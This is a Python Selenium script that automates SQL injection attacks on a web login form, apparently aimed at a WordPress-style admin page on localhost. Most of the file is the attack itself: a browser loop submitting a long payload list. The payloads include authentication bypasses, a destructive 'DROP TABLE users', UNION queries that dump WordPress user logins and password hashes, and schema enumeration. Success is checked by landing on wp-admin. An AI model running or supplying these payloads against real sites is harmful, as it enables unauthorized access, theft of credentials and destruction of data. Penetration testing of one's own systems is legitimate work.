from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

def test_sql_injection(url, username_payloads, password_payloads):
    # Set the path to chromedriver
    chromedriver_path = "/usr/bin/chromedriver"

    # Initialize Chrome WebDriver with options
    service = Service(executable_path=chromedriver_path)
    options = webdriver.ChromeOptions()

    # Uncomment the following line if you want to run Chrome in headless mode (without GUI)
    #options.add_argument("--headless")

    driver = webdriver.Chrome(service=service, options=options)

    try:
        # Open the login page
        driver.get(url)

        for username_payload in username_payloads:
            for password_payload in password_payloads:
                # Find the username input field and fill it out with the payload
                username_input = driver.find_element("name", "email")
                username_input.clear()
                username_input.send_keys(username_payload)

                # Find the password input field and fill it out with the password payload
                password_input = driver.find_element("name", "password")
                password_input.clear()
                password_input.send_keys(password_payload)

                # Submit the form
                submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                submit_button.click()

                # Wait for a few seconds to see the result
                driver.implicitly_wait(5)

                time.sleep(2)

                # Check if the login was successful by verifying the resulting URL
                if "wp-admin" in driver.current_url.lower():
                    print(f"Username Payload '{username_payload}' and Password Payload '{password_payload}' - SQL Injection Successful!")
                else:
                    print(f"Username Payload '{username_payload}' and Password Payload '{password_payload}' - Website not vulnerable to SQL injection.")

                # Go back to the login page for the next attempt
                driver.get(url)

    except Exception as e:
        print("Error:", e)
    finally:
        # Close the browser
        driver.quit()

if __name__ == "__main__":
    # Set the URL of the login page
    login_page_url = "http://localhost/shahid/admin/"

    # Set the list of SQL injection payloads for the email field
    sql_injection_payloads_email = [
        "test@gmail.com",
        # Add more payloads here...
    ]

    # Set the list of SQL injection payloads for the password field
    # Set the list of SQL injection payloads for the password field
    sql_injection_payloads_password = [
        "' OR 'x'='x",
        "'; --",
        "' OR 1=1; --",
        "1; DROP TABLE users; --",
        "admin'--",
        "'; SELECT * FROM users; --",
        "UNION SELECT username, password FROM users; --",
        "' AND 1=0 UNION SELECT username, password FROM users; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1' --",
        "admin' or '1'='1' #",
        "admin' or '1'='1' /*",
        "' OR EXISTS(SELECT * FROM users) AND ''='",
        "' UNION SELECT 1, version() --",
        "' UNION SELECT 1, table_name FROM information_schema.tables --",
        "' OR '1'='1' AND 'pw'='pw' --",
        "' OR 1=1 LIMIT 1 --",
        "' OR 'x'='x' --",
        "' UNION SELECT null, version() --",
        "' UNION SELECT null, table_name FROM information_schema.tables --",
        "' OR 1=1 UNION SELECT null, table_name FROM information_schema.tables --",
        "' OR '1'='1' AND user_pass LIKE 'a%' --",
        "' OR '1'='1' ORDER BY 1 --",
        "' UNION SELECT null, concat(user_login, 0x3a, user_pass) FROM wp_users --",
        "' UNION SELECT null, table_name FROM information_schema.tables WHERE table_name LIKE 'wp_%' --",
        "' OR '1'='1' AND user_pass LIKE 'a%' --",
        "' OR '1'='1' ORDER BY 1 --",
        "' UNION SELECT null, concat(user_login, 0x3a, user_pass) FROM wp_users --",
        "' UNION SELECT null, users FROM information_schema.tables WHERE table_name LIKE 'wp_%' --",
        "' UNION SELECT null, group_concat(user_login, 0x3a, user_pass) FROM wp_users --",
        "' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --",
        "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='wp_users' --",
        "123456"

        # Add more payloads here...
    ]


    # Test SQL injection with the provided payloads
    test_sql_injection(login_page_url, sql_injection_payloads_email, sql_injection_payloads_password)
